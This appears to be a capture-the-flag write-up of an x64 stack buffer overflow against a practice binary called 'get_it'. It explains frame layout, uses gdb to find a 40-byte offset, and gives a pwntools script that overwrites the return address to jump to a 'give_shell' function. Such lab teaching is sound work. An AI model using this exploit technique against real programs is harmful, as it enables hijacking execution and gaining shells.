###  x64 Stack Frame Analysis**

#### **1. Function Call Mechanism**

In the x64 architecture, a standard function call involves a precise sequence of operations to ensure that control flow can be correctly returned to the caller. When a `call` instruction is executed, the address of the instruction immediately following the `call` is pushed onto the stack. This **return address** is the value that will be loaded back into the instruction pointer (`rip`) when the function finishes.

#### **2. Stack Frame Setup**

Upon entry, the called function (the "callee") typically establishes its own stack frame to manage local variables and maintain state. This is achieved through a standard function prologue:

1.  **`push rbp`**: The base pointer register (`rbp`), which currently points to the base of the *caller's* stack frame, is pushed onto the stack. This saves the caller's frame context.
2.  **`mov rbp, rsp`**: The value of the stack pointer (`rsp`) is copied into `rbp`. This establishes the new frame's base, with `rbp` now serving as a stable "anchor" for the callee's stack frame.

#### **3. Frame Pointer Offsets**

Once the `rbp` register is set for the new frame, the locations of the saved context from the caller are at fixed, predictable offsets relative to `rbp`:
-   **`rbp+0x0`**: This address holds the **saved base pointer** of the caller's stack frame.
-   **`rbp+0x8`**: This address holds the **return address** that the `call` instruction pushed onto the stack.

When the function is ready to return, its epilogue (`leave` and `ret`) uses these saved values to restore the caller's stack frame and resume execution at the correct location.

```Breakpoint 1, 0x00000000004005f1 in main ()

[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffde70 - 0x7fffffffde78  →   "15935728"
```
To determine the precise offset needed to overwrite the return address, I used `gdb` for dynamic analysis. After setting a breakpoint after the `gets` call, I ran the program with a unique pattern as input. Using the `info frame` command, I identified that the saved return address was stored at memory location **`0x7fffffffde98`**. Next, by using the `search-pattern` command, I located my input string on the stack starting at address **`0x7fffffffde70`**.

With these two addresses, the offset is a simple calculation: `0x7fffffffde98` (return address) - `0x7fffffffde70` (buffer start) = `0x28`, or **40 bytes**. This confirms that the first 32 bytes of input fill the intended buffer, the next 8 bytes overwrite the saved `rbp`, and any subsequent data will overwrite the return address. Therefore, the final payload consists of 40 bytes of arbitrary padding followed by the 8-byte little-endian address of the `give_shell` function. When the `ret` instruction is executed, it will pop this malicious address into the instruction pointer, successfully diverting execution and providing a shell.
```python
from pwn import *

target = process("./get_it")
#gdb.attach(target, gdbscript = 'b *0x4005f1')

payload = ""
payload += "0"*40 # Padding to the return address
payload += p64(0x4005b6) # Address of give_shell in least endian, will be new saved return address


target.sendline(payload)


target.interactive()
```
